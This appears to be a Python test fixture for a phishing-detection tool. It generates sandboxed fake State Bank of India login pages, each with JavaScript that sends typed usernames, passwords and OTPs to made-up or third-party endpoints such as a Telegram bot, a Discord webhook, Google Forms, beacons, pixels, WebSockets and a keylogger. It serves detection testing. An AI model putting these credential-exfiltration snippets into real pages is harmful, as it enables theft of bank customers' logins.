"""The kit zoo (P9): small, hand-made pages, one per way a phishing kit moves what the victim types.

Used by the tests (``tests/deep/test_tracker.py``) and the evaluation (``bench/p9_tracker_eval.py``) to measure
which exfiltration techniques the Credential Tracker sees. Each page is served only inside the sandbox as
``<name>.kit-zoo.top``; every endpoint below is made up and answered locally (nothing resolves). Two entries are
**expected misses**, kept on purpose: server-side mail (invisible from any browser) and a hex-encoded payload
(the tracker decodes URL-encoding and base64, not every encoding).

Techniques modelled on public kit write-ups (Cofense on Telegram bots; Imperva / Group-IB on PHP ``mail()``
kits), written by us; no kit code is copied.
"""

from __future__ import annotations

from doppel.deep.pages import fake_telegram_token

ZOO_DOMAIN = "kit-zoo.top"

FORM = """<!doctype html><html><head><title>SBI Net Banking - Login</title></head><body>
<h1>State Bank of India: Net Banking</h1>
<form id="f" action="{action}" method="{method}">
  <input name="user" placeholder="Username">
  <input name="pass" type="password" placeholder="Password">
  <input name="otp" placeholder="OTP">
  <button type="submit">Login</button>
</form>{script}</body></html>"""

LOOSE = """<!doctype html><html><head><title>SBI Login</title></head><body>
<h1>State Bank of India</h1>
<div class="box"><input id="u" placeholder="Username"><input id="p" type="password" placeholder="Password">
<div role="button" id="go" style="padding:8px;background:#28a;color:#fff;width:80px">Login</div></div>
<script>{script}</script></body></html>"""

BLOG = "<!doctype html><html><head><title>Chai and code</title></head><body><h1>Recipes</h1><p>Masala chai.</p></body></html>"

# On submit: stop the normal post, collect the fields, run BODY (it can use `data`, an object, and `f`, the form).
HOOK = """<script>
document.getElementById('f').addEventListener('submit', function (e) {{
  e.preventDefault();
  var f = e.target, data = {{}};
  new FormData(f).forEach(function (v, k) {{ data[k] = v; }});
  {body}
}});
</script>"""


def _kit(name, technique, *, action="/login.php", method="post", body=None, page=None, backend=None,
         expect_hosts=(), expect_channel=None, expect_c15=None, expect_redirect=False, miss=None, real_route=None):
    host = f"{name}.{ZOO_DOMAIN}".replace("_", "-")
    if page is None:
        page = FORM.format(action=action, method=method, script=HOOK.format(body=body) if body else "")
    return {"name": name, "host": host, "technique": technique, "html": page, "backend": backend,
            "expect_hosts": [h.replace("{host}", host) for h in expect_hosts], "expect_channel": expect_channel,
            "expect_c15": expect_c15, "expect_redirect": expect_redirect, "miss": miss, "real_route": real_route}


def zoo() -> list[dict]:
    tok = fake_telegram_token("zoo")
    return [
        _kit("form_post_own", "HTML form posts to the kit's own server (the most common kit)",
             expect_hosts=["{host}"]),
        _kit("form_post_foreign", "HTML form posts to another domain", action="https://collect.drop-secure.xyz/p.php",
             expect_hosts=["collect.drop-secure.xyz"]),
        _kit("form_get_foreign", "HTML form, GET with the fields in the URL", method="get",
             action="https://collect.drop-secure.xyz/g.php", expect_hosts=["collect.drop-secure.xyz"]),
        _kit("fetch_telegram", "fetch() to the Telegram bot API (client-side kit)",
             body=("fetch('https://api.telegram.org/bot" + tok + "/sendMessage', {method: 'POST', "
                   "body: new URLSearchParams({chat_id: '-1009', text: JSON.stringify(data)})});"),
             expect_hosts=["api.telegram.org"], expect_channel="telegram"),
        _kit("xhr_discord", "XHR with JSON to a Discord webhook",
             body=("var x = new XMLHttpRequest(); x.open('POST', 'https://discord.com/api/webhooks/112233445566/"
                   "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789'); x.setRequestHeader('Content-Type', 'application/json');"
                   "x.send(JSON.stringify({content: JSON.stringify(data)}));"),
             expect_hosts=["discord.com"], expect_channel="discord"),
        _kit("google_forms", "fetch(no-cors) to a Google Forms formResponse",
             body=("fetch('https://docs.google.com/forms/d/e/1FAIpQLSfZooKit/formResponse', {method: 'POST', "
                   "mode: 'no-cors', body: new URLSearchParams({'entry.111': data.user, 'entry.222': data.pass})});"),
             expect_hosts=["docs.google.com"], expect_channel="google_forms"),
        _kit("apps_script", "GET to a Google Apps Script web app",
             body="fetch('https://script.google.com/macros/s/AKfyZooKit/exec?d=' + encodeURIComponent(JSON.stringify(data)));",
             expect_hosts=["script.google.com"], expect_channel="google_forms"),
        _kit("workers_relay", "fetch() JSON to a serverless relay (workers.dev)",
             body=("fetch('https://relay-7f3.zoo.workers.dev/c', {method: 'POST', headers: {'Content-Type': "
                   "'application/json'}, body: JSON.stringify(data)});"),
             expect_hosts=["relay-7f3.zoo.workers.dev"]),
        _kit("beacon", "navigator.sendBeacon (survives the page closing)",
             body="navigator.sendBeacon('https://stats.cdn-metrics.top/b', JSON.stringify(data));",
             expect_hosts=["stats.cdn-metrics.top"]),
        _kit("image_pixel", "an image pixel with the data in its URL",
             body="new Image().src = 'https://px.cdn-metrics.top/p.gif?d=' + encodeURIComponent(data.user + '|' + data.pass);",
             expect_hosts=["px.cdn-metrics.top"]),
        _kit("base64_body", "base64-encoded JSON body",
             body="fetch('https://api.secure-check.top/v', {method: 'POST', body: btoa(JSON.stringify(data))});",
             expect_hosts=["api.secure-check.top"]),
        _kit("websocket", "WebSocket frame",
             body=("var ws = new WebSocket('wss://ws.secure-check.top/s'); "
                   "ws.onopen = function () { ws.send(JSON.stringify(data)); };"),
             expect_hosts=["ws.secure-check.top"]),
        _kit("keylogger", "keystroke logger: sends each field as it's typed, before any submit",
             page=FORM.format(action="/login.php", method="post", script=(
                 "<script>document.querySelectorAll('input').forEach(function (el) { el.addEventListener('change', "
                 "function () { navigator.sendBeacon('https://k.secure-check.top/k', el.name + '=' + el.value); }); });"
                 "document.getElementById('f').addEventListener('submit', function (e) { e.preventDefault(); });</script>")),
             expect_hosts=["k.secure-check.top"]),
        _kit("delayed", "sends 1 s after the submit (setTimeout)",
             body="setTimeout(function () { fetch('https://late.secure-check.top/l', {method: 'POST', body: JSON.stringify(data)}); }, 1000);",
             expect_hosts=["late.secure-check.top"]),
        _kit("no_form_button", "no <form>: inputs + a clickable div, sent by fetch",
             page=LOOSE.format(script=(
                 "document.getElementById('go').addEventListener('click', function () { fetch('https://api.secure-check.top/d', "
                 "{method: 'POST', body: JSON.stringify({u: document.getElementById('u').value, "
                 "p: document.getElementById('p').value})}); });")),
             expect_hosts=["api.secure-check.top"]),
        _kit("accepts_any_bounce", "accepts any password, then bounces to the real bank (DynaPhish invariant)",
             backend={"accepts": "any", "then": "https://onlinesbi.sbi.bank.in/"},
             expect_hosts=["{host}"], expect_c15="accepted", expect_redirect=True),
        _kit("rejects", "rejects wrong logins, like a real login page", backend={"accepts": "none"},
             expect_hosts=["{host}"], expect_c15="rejected"),
        _kit("server_side_mail", "posts to its own server, which mails the details on (PHP mail())",
             action="/next.php", backend={"accepts": "any"}, expect_hosts=["{host}"], expect_c15="accepted",
             miss="the onward hop (PHP mail() to the attacker's mailbox) happens on the server: no browser can see it",
             real_route="{host} -> SMTP -> attacker mailbox"),
        _kit("hex_body", "hex-encoded payload",
             body=("var h = ''; var s = JSON.stringify(data); for (var i = 0; i < s.length; i++) "
                   "h += s.charCodeAt(i).toString(16); fetch('https://hx.secure-check.top/h', {method: 'POST', body: h});"),
             expect_hosts=["hx.secure-check.top"],
             miss="the tracker decodes URL-encoding and base64, not hex: the canary isn't found in the body"),
        _kit("no_form", "an ordinary page with no login form", page=BLOG),
    ]


def by_name(name: str) -> dict:
    return next(k for k in zoo() if k["name"] == name)
